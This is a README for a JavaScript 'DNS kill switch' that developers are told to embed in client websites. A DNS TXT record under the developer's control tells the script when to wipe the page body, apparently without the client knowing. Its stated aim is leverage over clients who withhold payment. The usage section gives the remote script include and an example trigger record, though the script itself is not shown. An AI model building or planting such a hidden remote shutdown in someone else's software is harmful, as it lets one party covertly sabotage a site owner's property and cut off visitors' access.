# DNS Kill Switch

This repository contains a JavaScript script that can be used to implement a kill switch for websites. The script checks
a DNS TXT record and, based on the configuration, can remove all content from the website's body.

## Introduction

When developing a website on behalf of a client, there may be instances where the client does not fulfill payment
obligations and removes the developer's access to the site. By integrating this script, developers can obscure the
website, ensuring they have a means to protect their work if necessary.

## How it works

1. The script fetches a DNS TXT record from a domain of your choice (ex. `kill.yourdomain.com`);
2. The TXT record should contain data in the format `domain=status; domain=status;`;
3. If the current domain exists and its status is `1`, the script will remove all content from the `<body>` of the
   website.

## Usage

1. Replace `kill.yourdomain.com` in the script with your own domain where the DNS TXT record is hosted;
2. Host your version of the script somewhere accessible to the website, then include the script in the `<head>`
section of the website:

```html
<script src="https://username.github.io/your-repository/script.js" defer></script>
```

### Example DNS TXT Record

In this example, only `anotherexample.com` will have its content removed.

```
kill.yourdomain.com. IN TXT "example.com=0; anotherexample.com=1;"
```

## License

This project is licensed under the MIT License. See the LICENSE file for details.